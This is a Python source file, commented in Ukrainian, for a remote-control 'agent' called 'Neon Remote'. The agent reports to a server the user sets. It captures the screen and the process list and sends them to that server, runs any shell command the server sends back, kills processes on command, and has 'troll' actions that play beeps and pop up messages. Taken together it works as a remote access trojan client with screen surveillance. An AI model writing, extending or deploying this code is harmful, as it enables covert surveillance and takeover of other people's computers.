import time
import os
import io
import base64
import subprocess
import requests
import psutil
from PIL import ImageGrab

# ⚙️ ВКАЖИ ТУТ IP ТА ПОРТ СВОГО СЕРВЕРА!
SERVER_URL = "http://127.0.0.1:5000"

def get_screenshot_b64():
    try:
        img = ImageGrab.grab()
        img.thumbnail((1280, 720)) # Оптимізуємо розмір для швидкості
        buffer = io.BytesIO()
        img.save(buffer, format="JPEG", quality=50)
        return base64.b64encode(buffer.getvalue()).decode('utf-8')
    except Exception:
        return ""

def get_processes():
    procs = []
    try:
        for p in psutil.process_iter(['pid', 'name']):
            procs.append(p.info)
            if len(procs) >= 30: # Обмежуємо першими 30 для легковажності
                break
    except Exception:
        pass
    return procs

def execute_cmd(command):
    try:
        res = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
        output = res.stdout or res.stderr or "Команда виконана (немає виводу)."
        return output
    except Exception as e:
        return f"Помилка виконання: {str(e)}"

def run_agent():
    print(f"🤖 Агент запущено. Підключення до сервера: {SERVER_URL}")
    last_cmd_out = None
    
    while True:
        try:
            # 1. Збираємо дані з ПК
            cpu = psutil.cpu_percent()
            ram = psutil.virtual_memory().percent
            screen_b64 = get_screenshot_b64()
            procs = get_processes()
            
            payload = {
                'cpu': cpu,
                'ram': ram,
                'screenshot': screen_b64,
                'processes': procs,
                'cmd_output': last_cmd_out
            }
            last_cmd_out = None # Очищаємо після відправки

            # 2. Надсилаємо звіти на сервер і отримуємо нові команди
            response = requests.post(f"{SERVER_URL}/api/agent/report", json=payload, timeout=5)
            
            if response.status_code == 200:
                data = response.json()
                commands = data.get('commands', [])
                
                # 3. Виконуємо отримані команди
                for item in commands:
                    c_type = item.get('type')
                    c_payload = item.get('payload')
                    
                    if c_type == 'cmd':
                        print(f"Executing CMD: {c_payload}")
                        last_cmd_out = execute_cmd(c_payload)
                        
                    elif c_type == 'kill_proc':
                        try:
                            psutil.Process(int(c_payload)).kill()
                            last_cmd_out = f"Процес {c_payload} завершено."
                        except Exception as e:
                            last_cmd_out = f"Не вдалося завершити PID {c_payload}: {e}"
                            
                    elif c_type == 'troll':
                        if c_payload == 'beep':
                            import winsound
                            winsound.Beep(1000, 500)
                        elif c_payload == 'msg':
                            execute_cmd('msg * "Hello from Neon Remote!"')

        except Exception as e:
            # Якщо сервер недоступний — просто чекаємо 3 секунди
            time.sleep(3)
            continue
            
        time.sleep(1.5) # Інтервал оновлення

if __name__ == '__main__':
    run_agent()
